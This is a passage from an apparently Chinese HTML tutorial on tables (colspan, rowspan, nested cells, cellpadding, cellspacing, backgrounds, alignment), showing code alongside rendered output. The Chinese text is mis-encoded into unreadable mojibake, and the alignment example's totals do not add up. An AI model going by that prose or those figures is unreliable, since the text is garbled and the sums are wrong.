¼è·¨è¡Œè·¨åˆ—" class="headerlink" title="å•å…ƒæ ¼è·¨è¡Œè·¨åˆ—"></a>å•å…ƒæ ¼è·¨è¡Œè·¨åˆ—</h3><p><strong>æ¨ªè·¨åˆ—ï¼š</strong><code>colspan</code>å±æ€§</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>å§“å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç”µè¯<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1"><tbody><tr>  <th>å§“å</th>  <th colspan="2">ç”µè¯</th></tr><tr>  <td>Miao</td>  <td>123456</td>  <td>654321</td></tr></tbody></table><p><strong>æ¨ªè·¨è¡Œï¼š</strong><code>rowspan</code>å±æ€§</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>å§“å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">rowspan</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç”µè¯<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1"><tbody><tr>  <th>å§“å</th>  <td>Miao</td></tr><tr>  <th rowspan="2">ç”µè¯</th>  <td>123456</td></tr><tr>  <td>654321</td></tr></tbody></table><h3 id="è¡¨æ ¼å†…æ ‡ç­¾"><a href="#è¡¨æ ¼å†…æ ‡ç­¾" class="headerlink" title="è¡¨æ ¼å†…æ ‡ç­¾"></a>è¡¨æ ¼å†…æ ‡ç­¾</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯å¦ä¸€ä¸ªæ®µè½ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªè¡¨æ ¼ï¼š   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>B<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>C<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªåˆ—è¡¨ï¼š   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è è<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>ä¸€å¼ å›¾ç‰‡ï¼š  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Basic/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTML5<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1"><tbody><tr>  <td>   <p>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚</p>   <p>è¿™æ˜¯å¦ä¸€ä¸ªæ®µè½ã€‚</p>  </td>  <td>è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªè¡¨æ ¼ï¼š   <table border="1">   <tbody><tr>     <td>A</td>     <td>B</td>   </tr>   <tr>     <td>C</td>     <td>D</td>   </tr>   </tbody></table>  </td></tr><tr>  <td>è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªåˆ—è¡¨ï¼š   <ul>    <li>è‹¹æœ</li>    <li>é¦™è•‰</li>    <li>è è</li>   </ul>  </td>  <td>ä¸€å¼ å›¾ç‰‡ï¼š      <img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" alt="HTML5">  </td></tr></tbody></table><h3 id="å•å…ƒæ ¼è¾¹è·"><a href="#å•å…ƒæ ¼è¾¹è·" class="headerlink" title="å•å…ƒæ ¼è¾¹è·"></a>å•å…ƒæ ¼è¾¹è·</h3><p>Cellpadding å•å…ƒæ ¼å†…å®¹ä¸å…¶è¾¹æ¡†ä¹‹é—´çš„ç©ºç™½ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellpadding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1" cellpadding="20"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><h3 id="å•å…ƒæ ¼é—´è·"><a href="#å•å…ƒæ ¼é—´è·" class="headerlink" title="å•å…ƒæ ¼é—´è·"></a>å•å…ƒæ ¼é—´è·</h3><p>cellspacing å¢åŠ å•å…ƒæ ¼ä¹‹é—´çš„è·ç¦»ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1" cellspacing="20"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><h3 id="è¡¨æ ¼-å•å…ƒæ ¼èƒŒæ™¯"><a href="#è¡¨æ ¼-å•å…ƒæ ¼èƒŒæ™¯" class="headerlink" title="è¡¨æ ¼/å•å…ƒæ ¼èƒŒæ™¯"></a>è¡¨æ ¼/å•å…ƒæ ¼èƒŒæ™¯</h3><p>èƒŒæ™¯é¢œè‰²<code>bgcolor</code>å±æ€§</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yellow<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1" bgcolor="yellow"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><p>èƒŒæ™¯å›¾åƒ<code>background</code>å±æ€§</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Basic/html5.jpg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1" background="FrontEnd_HTML_Basic/html5.jpg"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><p>å•å…ƒæ ¼èƒŒæ™¯åŒç†ï¼ŒåŠ åœ¨ç›¸åº”çš„<code>td</code>æ ‡ç­¾é‡Œå³å¯ã€‚ä¾‹å¦‚ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>blue<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1"><tbody><tr>  <td bgcolor="blue">First</td>  <td>Row</td></tr>   </tbody></table><h3 id="æ’åˆ—å†…å®¹"><a href="#æ’åˆ—å†…å®¹" class="headerlink" title="æ’åˆ—å†…å®¹"></a>æ’åˆ—å†…å®¹</h3><p><code>align</code>å±æ€§</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æ¶ˆè´¹é¡¹ç›®....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ä¸€æœˆ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>äºŒæœˆ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è¡£æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>$241.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>$50.20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>é£Ÿç‰©<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>$730.40<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>$650.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æ€»è®¡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>$1001.50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>$744.65<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table width="400" border="1"> <tbody><tr>  <th align="center">æ¶ˆè´¹é¡¹ç›®....</th>  <th align="center">ä¸€æœˆ</th>  <th align="center">äºŒæœˆ</th> </tr> <tr>  <td align="left">è¡£æœ</td>  <td align="right">$241.10</td>  <td align="right">$50.20</td> </tr> <tr>  <td align="left">é£Ÿç‰©</td>  <td align="right">$730.40</td>  <td align="right">$650.00</td> </tr> <tr>  <th align="left">æ€»è®¡</th>  <th align="right">$1001.50</th>  <th align="right">$744.65</th> </tr></tbody></table><h3 